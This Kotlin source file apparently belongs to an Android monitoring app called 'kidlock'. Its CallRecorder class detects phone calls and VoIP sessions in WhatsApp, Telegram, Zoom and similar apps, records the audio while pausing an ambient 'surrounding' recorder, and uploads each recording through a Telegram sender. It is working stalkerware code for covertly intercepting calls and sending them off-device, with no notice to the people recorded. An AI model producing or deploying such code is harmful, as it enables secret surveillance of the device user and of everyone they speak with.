package com.kidlock

import android.app.usage.UsageStatsManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.telephony.PhoneStateListener
import android.telephony.TelephonyCallback
import android.telephony.TelephonyManager
import android.util.Log
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class CallRecorder(private val context: Context) {

    private var recorder: MediaRecorder? = null
    private var outputFile: File? = null
    private var isRecording = false
    private val handler = Handler(Looper.getMainLooper())
    private val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

    private val voipApps = setOf(
        "com.whatsapp", "com.whatsapp.w4b",
        "org.telegram.messenger", "org.telegram.plus",
        "com.viber.voip", "com.skype.raider",
        "com.google.android.apps.meetings",
        "us.zoom.videomeetings"
    )

    private val telephonyCallback: TelephonyCallback? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
        object : TelephonyCallback(), TelephonyCallback.CallStateListener {
            override fun onCallStateChanged(state: Int) { handleCallState(state) }
        }
    } else null

    @Suppress("DEPRECATION")
    private val phoneStateListener: PhoneStateListener? = if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
        object : PhoneStateListener() {
            @Deprecated("Deprecated in Java")
            override fun onCallStateChanged(state: Int, phoneNumber: String?) { handleCallState(state) }
        }
    } else null

    private val phoneReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.getStringExtra(TelephonyManager.EXTRA_STATE)) {
                TelephonyManager.EXTRA_STATE_OFFHOOK -> handleCallState(TelephonyManager.CALL_STATE_OFFHOOK)
                TelephonyManager.EXTRA_STATE_IDLE    -> handleCallState(TelephonyManager.CALL_STATE_IDLE)
            }
        }
    }

    private fun handleCallState(state: Int) {
        when (state) {
            TelephonyManager.CALL_STATE_OFFHOOK -> {
                if (!isRecording) { SurroundingRecorder.pause(); startRecording("gsm") }
            }
            TelephonyManager.CALL_STATE_IDLE -> {
                if (isRecording) { stopAndSend("📞 GSM Call"); SurroundingRecorder.resume() }
            }
        }
    }

    private var voipActive = false
    private var voipCheckRunning = false

    private val voipChecker = object : Runnable {
        override fun run() {
            if (!isRecording) {
                val current = getForegroundApp()
                if (current in voipApps) {
                    if (!voipActive) { voipActive = true; SurroundingRecorder.pause(); startRecording("voip_${current.substringAfterLast('.')}") }
                } else if (voipActive) {
                    voipActive = false; stopAndSend("📱 VOIP Call"); SurroundingRecorder.resume()
                }
            }
            if (voipCheckRunning) handler.postDelayed(this, 1500)
        }
    }

    private fun getForegroundApp(): String {
        return try {
            val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
            val now = System.currentTimeMillis()
            val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, now - 5000, now)
            stats.maxByOrNull { it.lastTimeUsed }?.packageName ?: ""
        } catch (e: Exception) { "" }
    }

    fun start() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && telephonyCallback != null) {
                telephonyManager.registerTelephonyCallback(context.mainExecutor, telephonyCallback)
            } else if (phoneStateListener != null) {
                @Suppress("DEPRECATION")
                telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
            }
        } catch (e: Exception) { Log.e("CallRecorder", "telephony register error: ${e.message}") }
        try { context.registerReceiver(phoneReceiver, IntentFilter(TelephonyManager.ACTION_PHONE_STATE_CHANGED)) } catch (e: Exception) {}
        voipCheckRunning = true
        handler.post(voipChecker)
    }

    fun startRecording(label: String) {
        if (isRecording) return
        for (source in listOf(MediaRecorder.AudioSource.VOICE_CALL, MediaRecorder.AudioSource.VOICE_RECOGNITION)) {
            try {
                val ts = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
                outputFile = File(context.cacheDir, "${label}_$ts.mp4")
                recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(context)
                           else @Suppress("DEPRECATION") MediaRecorder()
                recorder?.apply {
                    setAudioSource(source)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioSamplingRate(44100)
                    setAudioEncodingBitRate(128000)
                    setOutputFile(outputFile!!.absolutePath)
                    prepare(); start()
                }
                isRecording = true
                return
            } catch (e: Exception) {
                Log.e("CallRecorder", "start($source) error: ${e.message}")
                try { recorder?.release() } catch (_: Exception) {}
                recorder = null
            }
        }
        SurroundingRecorder.resume()
    }

    fun stopAndSend(caption: String = "📞 Call") {
        if (!isRecording) return
        try { recorder?.apply { stop(); release() } } catch (e: Exception) {}
        recorder = null; isRecording = false
        outputFile?.let { file ->
            if (file.exists() && file.length() > 2048) {
                val ts = SimpleDateFormat("dd MMM yyyy, HH:mm", Locale.getDefault()).format(Date())
                TelegramListener.instance.sendAudio(file.absolutePath, "$caption — $ts")
            } else file.delete()
        }
    }

    fun stop() {
        voipCheckRunning = false
        handler.removeCallbacksAndMessages(null)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && telephonyCallback != null)
                telephonyManager.unregisterTelephonyCallback(telephonyCallback)
            else if (phoneStateListener != null)
                @Suppress("DEPRECATION") telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
        } catch (e: Exception) {}
        try { context.unregisterReceiver(phoneReceiver) } catch (e: Exception) {}
        if (isRecording) stopAndSend()
    }
}
